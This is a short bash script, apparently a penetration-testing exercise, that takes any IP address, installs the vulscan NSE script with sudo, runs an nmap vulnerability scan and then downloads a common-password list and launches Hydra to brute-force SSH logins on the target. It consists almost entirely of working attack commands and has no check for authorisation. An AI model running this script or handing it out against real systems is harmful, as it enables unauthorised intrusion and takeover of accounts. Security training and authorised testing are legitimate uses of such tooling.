#!/bin/bash

# Greetings UserName by time
function GR() {
    clear
    currenttime=$(date +%H:%M)
    if [[ "$currenttime" > "04:59" ]] && [[ "$currenttime" < "12:00" ]]; then
        echo "//Good morning $USER\\"
    elif [[ "$currenttime" > "11:59" ]] && [[ "$currenttime" < "18:00" ]]; then
        echo "//Good afternoon $USER\\"
    else
        echo "//Good evening $USER\\"
    fi
    echo ___________________________________
    echo
    sleep 0.5
}

# Getting the user input and make a directory
function IN() {
    echo "Type IP to scan:"
    read IP
    if [ ! -d "$HOME/Desktop/$IP" ]; then
        mkdir "$HOME/Desktop/$IP"
    else
        echo "Directory $IP already exists."
    fi
}

# Run ports and vulnerabilities scan
function SCAN() {
    if ! command -v nmap &> /dev/null; then
        echo "Nmap is not installed. Please install it first."
        exit 1
    fi
    
    if [ ! -d "/usr/share/nmap/scripts" ]; then
        echo "Nmap scripts directory not found. Please install nmap."
        exit 1
    fi

    echo "Cloning Vulscan repository..."
    cd /usr/share/nmap/scripts || exit
    sudo git clone https://github.com/scipag/vulscan scipag_vulscan
    sudo ln -s "$(pwd)/scipag_vulscan" /usr/share/nmap/scripts/vulscan
    echo "Running Nmap scan for vulnerabilities..."
    nmap -sV --script=vulscan/vulscan.nse $IP -oN "$HOME/Desktop/$IP/nmap.txt"
}

# Brute force weak passwords with SSH
function HYDRA() {
    echo "Does the SSH service seem up? (1/0)"
    read SSH
    if [ "$SSH" -eq 1 ]; then
        echo "Enter a username:"
        read USER
        cd "$HOME/Desktop/$IP" || exit
        if [ ! -f "password-list-top-1000.txt" ]; then
            echo "Downloading password list..."
            wget https://raw.githubusercontent.com/yuval328/WEAK/main/password-list-top-1000.txt
        fi
        echo "Running Hydra to brute-force SSH..."
        hydra -l "$USER" -P "$HOME/Desktop/$IP/password-list-top-1000.txt" $IP -t 4 ssh -o "$HOME/Desktop/$IP/hydra.txt"
    else
        echo "SSH service not detected. Skipping brute-force attack."
    fi
}

# Main script execution
GR
IN
SCAN
HYDRA
